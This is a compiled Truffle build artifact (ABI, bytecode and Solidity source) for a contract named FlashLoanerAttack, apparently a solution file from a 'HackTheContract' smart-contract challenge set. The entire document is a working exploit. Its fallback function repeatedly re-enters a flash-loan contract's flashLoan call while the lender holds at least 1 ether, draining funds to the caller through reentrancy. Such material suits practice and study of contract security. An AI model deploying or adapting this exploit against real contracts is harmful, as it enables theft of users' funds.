{
  "contractName": "FlashLoanerAttack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract FlashLoaner",
          "name": "_flashLoaner",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "run",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516105f33803806105f38339818101604052810190610032919061008d565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610111565b600081519050610087816100fa565b92915050565b60006020828403121561009f57600080fd5b60006100ad84828501610078565b91505092915050565b60006100c1826100da565b9050919050565b60006100d3826100b6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610103816100c8565b811461010e57600080fd5b50565b6104d3806101206000396000f3fe6080604052600436106100225760003560e01c8063c0406226146101a657610023565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101a45760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632bd94e9c670de0b6b3a7640000336040516024016040516020818303038152906040527f8bbefe4b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518463ffffffff1660e01b81526004016101509392919061038e565b602060405180830381600087803b15801561016a57600080fd5b505af115801561017e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101a2919061030e565b505b005b3480156101b257600080fd5b506101bb6101bd565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632bd94e9c670de0b6b3a7640000336040516024016040516020818303038152906040527f8bbefe4b000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518463ffffffff1660e01b81526004016102a49392919061038e565b602060405180830381600087803b1580156102be57600080fd5b505af11580156102d2573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102f6919061030e565b50565b60008151905061030881610486565b92915050565b60006020828403121561032057600080fd5b600061032e848285016102f9565b91505092915050565b610340816103e8565b82525050565b6000610351826103cc565b61035b81856103d7565b935061036b818560208601610442565b61037481610475565b840191505092915050565b61038881610430565b82525050565b60006060820190506103a3600083018661037f565b6103b06020830185610337565b81810360408301526103c28184610346565b9050949350505050565b600081519050919050565b600082825260208201905092915050565b60006103f382610406565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061043b82610426565b9050919050565b60005b83811015610460578082015181840152602081019050610445565b8381111561046f576000848401525b50505050565b6000601f19601f8301169050919050565b61048f816103fa565b811461049a57600080fd5b5056fea2646970667358221220b9280f4c5262a290ac02c3e6346e57a4264224b4ca74a14820d235de3e32e26a64736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\n\npragma solidity >= 0.8.0;\n\ninterface FlashLoaner {\n    function flashLoan(uint256 _requestedAmount, address payable _recipient, bytes memory _callback) external returns (bool);\n}\n\ncontract FlashLoanerAttack {\n    \n    FlashLoaner fl;\n    \n    constructor(FlashLoaner _flashLoaner) {\n        fl = _flashLoaner;\n    }\n    \n    function run() external {\n        fl.flashLoan(1 ether, payable(msg.sender), abi.encodeWithSignature(\"yeet()\"));\n\n    }\n    \n    fallback() external payable {\n        if (address(fl).balance >= 1 ether) {\n            fl.flashLoan(1 ether, payable(msg.sender), abi.encodeWithSignature(\"yeet()\"));\n        }\n    }\n}",
  "sourcePath": "/Users/simonperriard/Documents/Personnal/HackTheContract_Solutions/contracts/attacks/06.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.2",
  "updatedAt": "2021-08-18T07:32:40.518Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}